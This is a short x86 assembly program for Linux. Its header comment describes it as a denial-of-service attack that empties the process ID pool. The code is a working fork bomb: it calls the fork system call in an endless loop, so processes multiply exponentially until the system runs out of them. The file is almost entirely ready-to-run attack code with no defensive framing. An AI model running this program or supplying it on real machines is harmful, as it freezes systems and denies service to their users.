########################################################################
## DESCRIPTION:							      ##
## 	Create as many subprocesses as possible. Exponential growth.  ##
##      Expected result is to empty processID pool. DOS attack        ##
## ARGS:							      ##
## 	(none)							      ##
## INPUT:							      ##
## 	(none)							      ##
## OUTPUT:							      ##
##	(none)                                                        ##
########################################################################
	
	.equ LIN_INT,	0x80

	.equ SYS_FORK,	2
	
	.section .text
	.global _start
	
_start:
	movl $SYS_FORK,%eax	# create subprocess
	int $LIN_INT
	jmp _start